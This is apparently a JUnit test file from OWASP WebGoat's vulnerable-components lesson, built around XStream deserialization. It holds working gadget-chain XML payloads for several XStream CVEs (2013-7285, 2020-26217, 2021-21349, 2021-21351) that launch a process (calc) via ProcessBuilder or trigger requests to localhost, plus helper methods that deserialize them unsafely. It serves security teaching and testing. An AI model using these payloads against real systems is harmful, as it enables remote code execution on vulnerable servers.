/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.vulnerablecomponents;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertThrows;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.StreamException;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

public class VulnerableComponentsLessonTest {

  String strangeContact =
      "<contact class='dynamic-proxy'>\n"
          + "<interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>\n"
          + "  <handler class='java.beans.EventHandler'>\n"
          + "    <target class='java.lang.ProcessBuilder'>\n"
          + "      <command>\n"
          + "        <string>calc.exe</string>\n"
          + "      </command>\n"
          + "    </target>\n"
          + "    <action>start</action>\n"
          + "  </handler>\n"
          + "</contact>";
  String contact = "<contact>\n" + "</contact>";

  String CVE_2020_26217 =
      "<map>\n"
          + // Works with jdk 8
          "  <entry>\n"
          + "    <jdk.nashorn.internal.objects.NativeString>\n"
          + "      <flags>0</flags>\n"
          + "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n"
          + "        <dataHandler>\n"
          + "          <dataSource"
          + " class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n"
          + "            <contentType>text/plain</contentType>\n"
          + "            <is class='java.io.SequenceInputStream'>\n"
          + "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n"
          + "                <iterator class='javax.imageio.spi.FilterIterator'>\n"
          + "                  <iter class='java.util.ArrayList$Itr'>\n"
          + "                    <cursor>0</cursor>\n"
          + "                    <lastRet>-1</lastRet>\n"
          + "                    <expectedModCount>1</expectedModCount>\n"
          + "                    <outer-class>\n"
          + "                      <java.lang.ProcessBuilder>\n"
          + "                        <command>\n"
          + "                          <string>calc</string>\n"
          + "                        </command>\n"
          + "                      </java.lang.ProcessBuilder>\n"
          + "                    </outer-class>\n"
          + "                  </iter>\n"
          + "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n"
          + "                    <method>\n"
          + "                      <class>java.lang.ProcessBuilder</class>\n"
          + "                      <name>start</name>\n"
          + "                      <parameter-types/>\n"
          + "                    </method>\n"
          + "                    <name>start</name>\n"
          + "                  </filter>\n"
          + "                  <next/>\n"
          + "                </iterator>\n"
          + "                <type>KEYS</type>\n"
          + "              </e>\n"
          + "              <in class='java.io.ByteArrayInputStream'>\n"
          + "                <buf></buf>\n"
          + "                <pos>0</pos>\n"
          + "                <mark>0</mark>\n"
          + "                <count>0</count>\n"
          + "              </in>\n"
          + "            </is>\n"
          + "            <consumed>false</consumed>\n"
          + "          </dataSource>\n"
          + "          <transferFlavors/>\n"
          + "        </dataHandler>\n"
          + "        <dataLen>0</dataLen>\n"
          + "      </value>\n"
          + "    </jdk.nashorn.internal.objects.NativeString>\n"
          + "    <string>test</string>\n"
          + "  </entry>\n"
          + "</map>";

  String CVE_2021_21349 =
      "<java.util.PriorityQueue serialization='custom'>\r\n"
          + "  <unserializable-parents/>\r\n"
          + "  <java.util.PriorityQueue>\r\n"
          + "    <default>\r\n"
          + "      <size>2</size>\r\n"
          + "      <comparator class='javafx.collections.ObservableList$1'/>\r\n"
          + "    </default>\r\n"
          + "    <int>3</int>\r\n"
          + "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n"
          + "      <dataHandler>\r\n"
          + "        <dataSource"
          + " class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n"
          + "          <contentType>text/plain</contentType>\r\n"
          + "          <is class='java.io.SequenceInputStream'>\r\n"
          + "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\r\n"
          + "              <iterator"
          + " class='com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator'>\r\n"
          + "                <configs class='sun.misc.FIFOQueueEnumerator'>\r\n"
          + "                  <queue>\r\n"
          + "                    <length>1</length>\r\n"
          + "                    <head>\r\n"
          + "                      <obj class='url'>http://localhost:8080/internal/</obj>\r\n"
          + "                    </head>\r\n"
          + "                    <tail reference='../head'/>\r\n"
          + "                  </queue>\r\n"
          + "                  <cursor reference='../queue/head'/>\r\n"
          + "                </configs>\r\n"
          + "                <returned class='sorted-set'/>\r\n"
          + "              </iterator>\r\n"
          + "              <type>KEYS</type>\r\n"
          + "            </e>\r\n"
          + "            <in class='java.io.ByteArrayInputStream'>\r\n"
          + "              <buf></buf>\r\n"
          + "              <pos>0</pos>\r\n"
          + "              <mark>0</mark>\r\n"
          + "              <count>0</count>\r\n"
          + "            </in>\r\n"
          + "          </is>\r\n"
          + "          <consumed>false</consumed>\r\n"
          + "        </dataSource>\r\n"
          + "        <transferFlavors/>\r\n"
          + "      </dataHandler>\r\n"
          + "      <dataLen>0</dataLen>\r\n"
          + "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n"
          + "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"
          + " reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\r\n"
          + "  </java.util.PriorityQueue>\r\n"
          + "</java.util.PriorityQueue>";

  String CVE_2021_21351 =
      "<sorted-set>\r\n"
          + "  <javax.naming.ldap.Rdn_-RdnEntry>\r\n"
          + "    <type>ysomap</type>\r\n"
          + "    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>\r\n"
          + "      <m__DTMXRTreeFrag>\r\n"
          + "        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>\r\n"
          + "          <m__size>-10086</m__size>\r\n"
          + "          <m__mgrDefault>\r\n"
          + "            <__overrideDefaultParser>false</__overrideDefaultParser>\r\n"
          + "            <m__incremental>false</m__incremental>\r\n"
          + "            <m__source__location>false</m__source__location>\r\n"
          + "            <m__dtms>\r\n"
          + "              <null/>\r\n"
          + "            </m__dtms>\r\n"
          + "            <m__defaultHandler/>\r\n"
          + "          </m__mgrDefault>\r\n"
          + "          <m__shouldStripWS>false</m__shouldStripWS>\r\n"
          + "          <m__indexing>false</m__indexing>\r\n"
          + "          <m__incrementalSAXSource"
          + " class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>\r\n"
          + "            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl'"
          + " serialization='custom'>\r\n"
          + "              <javax.sql.rowset.BaseRowSet>\r\n"
          + "                <default>\r\n"
          + "                  <concurrency>1008</concurrency>\r\n"
          + "                  <escapeProcessing>true</escapeProcessing>\r\n"
          + "                  <fetchDir>1000</fetchDir>\r\n"
          + "                  <fetchSize>0</fetchSize>\r\n"
          + "                  <isolation>2</isolation>\r\n"
          + "                  <maxFieldSize>0</maxFieldSize>\r\n"
          + "                  <maxRows>0</maxRows>\r\n"
          + "                  <queryTimeout>0</queryTimeout>\r\n"
          + "                  <readOnly>true</readOnly>\r\n"
          + "                  <rowSetType>1004</rowSetType>\r\n"
          + "                  <showDeleted>false</showDeleted>\r\n"
          + "                  <dataSource>http://localhost:8000/CallRemoteMethod</dataSource>\r\n"
          + "                  <listeners/>\r\n"
          + "                  <params/>\r\n"
          + "                </default>\r\n"
          + "              </javax.sql.rowset.BaseRowSet>\r\n"
          + "              <com.sun.rowset.JdbcRowSetImpl>\r\n"
          + "                <default/>\r\n"
          + "              </com.sun.rowset.JdbcRowSetImpl>\r\n"
          + "            </fPullParserConfig>\r\n"
          + "            <fConfigSetInput>\r\n"
          + "              <class>com.sun.rowset.JdbcRowSetImpl</class>\r\n"
          + "              <name>setAutoCommit</name>\r\n"
          + "              <parameter-types>\r\n"
          + "                <class>boolean</class>\r\n"
          + "              </parameter-types>\r\n"
          + "            </fConfigSetInput>\r\n"
          + "            <fConfigParse reference='../fConfigSetInput'/>\r\n"
          + "            <fParseInProgress>false</fParseInProgress>\r\n"
          + "          </m__incrementalSAXSource>\r\n"
          + "          <m__walker>\r\n"
          + "            <nextIsRaw>false</nextIsRaw>\r\n"
          + "          </m__walker>\r\n"
          + "          <m__endDocumentOccured>false</m__endDocumentOccured>\r\n"
          + "          <m__idAttributes/>\r\n"
          + "          <m__textPendingStart>-1</m__textPendingStart>\r\n"
          + "          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>\r\n"
          + "          <m__pastFirstElement>false</m__pastFirstElement>\r\n"
          + "        </m__dtm>\r\n"
          + "        <m__dtmIdentity>1</m__dtmIdentity>\r\n"
          + "      </m__DTMXRTreeFrag>\r\n"
          + "      <m__dtmRoot>1</m__dtmRoot>\r\n"
          + "      <m__allowRelease>false</m__allowRelease>\r\n"
          + "    </value>\r\n"
          + "  </javax.naming.ldap.Rdn_-RdnEntry>\r\n"
          + "  <javax.naming.ldap.Rdn_-RdnEntry>\r\n"
          + "    <type>ysomap</type>\r\n"
          + "    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n"
          + "      <m__obj class='string'>test</m__obj>\r\n"
          + "    </value>\r\n"
          + "  </javax.naming.ldap.Rdn_-RdnEntry>\r\n"
          + "</sorted-set>";

  @Test
  public void testTransformation() throws Exception {
    XStream xstream = new XStream();
    xstream.setClassLoader(Contact.class.getClassLoader());
    xstream.alias("contact", ContactImpl.class);
    xstream.ignoreUnknownElements();
    assertThat(xstream.fromXML(contact)).isNotNull();
  }

  @Test
  @Disabled
  public void testIllegalTransformation() throws Exception {
    XStream xstream = new XStream();
    xstream.setClassLoader(Contact.class.getClassLoader());
    xstream.alias("contact", ContactImpl.class);
    xstream.ignoreUnknownElements();
    Exception e =
        assertThrows(
            RuntimeException.class,
            () -> ((Contact) xstream.fromXML(strangeContact)).getFirstName());
    assertThat(e.getCause().getMessage().contains("calc.exe")).isTrue();
  }

  @Test
  public void testIllegalPayload() throws Exception {
    XStream xstream = new XStream();
    xstream.setClassLoader(Contact.class.getClassLoader());
    xstream.alias("contact", ContactImpl.class);
    xstream.ignoreUnknownElements();
    Exception e =
        assertThrows(
            StreamException.class, () -> ((Contact) xstream.fromXML("bullssjfs")).getFirstName());
    assertThat(e.getCause().getMessage().contains("START_DOCUMENT")).isTrue();
  }

  // --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED
  // --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.text=ALL-UNNAMED
  // --add-opens=java.desktop/java.awt.font=ALL-UNNAMED
  // --add-opens=java.desktop/java.beans=ALL-UNNAMED
  // --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED
  // --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.text=ALL-UNNAMED
  // --add-opens=java.desktop/java.awt.font=ALL-UNNAMED
  // --add-opens=java.desktop/java.beans=ALL-UNNAMED
  // --add-opens=java.naming/javax.naming.ldap=ALL-UNNAMED
  public static void main2(String[] args) {
    System.out.println("CVE-2013-7285 --> :: xsteam@1.4.5");
    String xml =
        "<contact class='dynamic-proxy'>\r\n"
            + "  <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>\r\n"
            //				+ "  <interface>java.lang.Comparable</interface>\r\n"
            + "  <handler class='java.beans.EventHandler'>\r\n"
            + "    <target class='java.lang.ProcessBuilder'>\r\n"
            + "      <command>\r\n"
            + "        <string>calc</string>\r\n"
            + "      </command>\r\n"
            + "    </target>\r\n"
            + "    <action>start</action>\r\n"
            + "  </handler>\r\n"
            + "</contact>\r\n";
    XStream xstream = new XStream();
    Contact contact = (Contact) xstream.fromXML(xml);

    xstream.setClassLoader(Contact.class.getClassLoader());
    xstream.alias("contact", ContactImpl.class);
    xstream.ignoreUnknownElements();

    System.out.println(
        " xstream vul executed "
            + xstream.getClassLoader()
            + contact.getClass()
            + " first name : "
            + contact.getFirstName());
  }

  public static void main(String[] args) {
    VulnerableComponentsLessonTest vs = new VulnerableComponentsLessonTest();
    //		vs.testXStreamPayload(vs.CVE_2020_26217);
    System.out.println(vs.strangeContact);
  }

  public void testXStreamPayload(String xml) {

    XStream xstream = new XStream();
    xstream.fromXML(xml);
    System.out.println(" xstream call ended - " + xstream.getReflectionProvider());
  }
}
